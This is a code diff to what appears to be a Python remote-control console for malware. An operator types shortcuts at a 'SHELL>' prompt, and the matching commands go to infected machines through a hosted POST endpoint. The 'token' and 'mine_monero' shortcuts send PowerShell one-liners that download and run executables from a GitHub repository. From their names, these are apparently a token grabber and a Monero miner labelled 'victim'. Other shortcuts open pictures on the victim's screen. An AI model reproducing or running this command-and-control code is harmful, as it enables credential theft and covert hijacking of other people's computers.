@@ -19,7 +19,7 @@ POST_URL = "https://epic-servering-but-pytyohn.jonathanbreitg.repl.co/POST-CONTR
 while True:
 	command_to_send = input("SHELL>")
 	if command_to_send == "token":
-		command_to_send = "powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://github.com/jonathanbreitg/monero-minerV2/blob/main/grab_token.exe?raw=true.exe', 'grab_token.exe');./grab_token.exe"
+		command_to_send = "thread powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://github.com/jonathanbreitg/monero-minerV2/blob/main/grab_token.exe?raw=true.exe', 'grab_token.exe');./grab_token.exe"
 	elif command_to_send == "cpu":
 		command_to_send = "wmic cpu get loadpercentage"
 	elif command_to_send == "r":
@@ -27,7 +27,7 @@ while True:
 	elif command_to_send == "barak":
 		command_to_send = "start chrome https://media.discordapp.net/stickers/865029615457271828.png?size=160"
 	elif command_to_send == "mine_monero":
-		command_to_send = "powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://github.com/jonathanbreitg/monero-minerV2/blob/main/victim.zip?raw=true', 'victim.zip');Expand-Archive -Path victim.zip -DestinationPath victim;cd victim;cd victim;./victim.exe"
+		command_to_send = "thread powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://github.com/jonathanbreitg/monero-minerV2/blob/main/victim.zip?raw=true', 'victim.zip');Expand-Archive -Path victim.zip -DestinationPath victim;cd victim;cd victim;./victim.exe"
 	elif command_to_send == "barak2":
 		command_to_send = "powershell;$client = new-object System.Net.WebClient;$client.DownloadFile('https://media.discordapp.net/stickers/865029615457271828.png?size=160', 'barak.png');./barak.png"
 	elif command_to_send == "barak3":
